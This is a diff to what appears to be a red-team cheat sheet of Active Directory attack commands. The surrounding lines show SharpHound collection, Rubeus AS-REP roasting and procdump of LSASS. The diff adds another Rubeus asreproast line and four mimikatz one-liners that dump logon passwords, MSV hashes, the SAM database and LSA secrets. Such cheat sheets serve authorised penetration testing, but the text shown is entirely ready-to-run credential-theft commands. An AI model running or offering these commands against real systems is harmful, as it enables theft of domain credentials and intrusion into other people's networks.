@@ -64,6 +64,7 @@ sharp-hound-4 -- -c All -d my.local --domainController 172.16.1.15 --zipfilename
 
 # ASREP
 rubeus -- asreproast /format:hashcat /nowrap
+rubeus --timeout 120 -- asreproast /format:hashcat /nowrap /domain:
 # kerberoast
 ## enum
 delegationbof 6 child.my.local
@@ -101,6 +102,12 @@ hashdump
 # procdump
 ps -e lsass
 procdump --pid ??? /tmp/lsass.dmp
+
+# mimikatz
+mimikatz -- "privilege::debug" "sekurlsa::logonpasswords" "exit"
+mimikatz -- "privilege::debug" "sekurlsa::msv" "exit"
+mimikatz -- "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+mimikatz -- "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
 ```
 
 ## Lateral Move
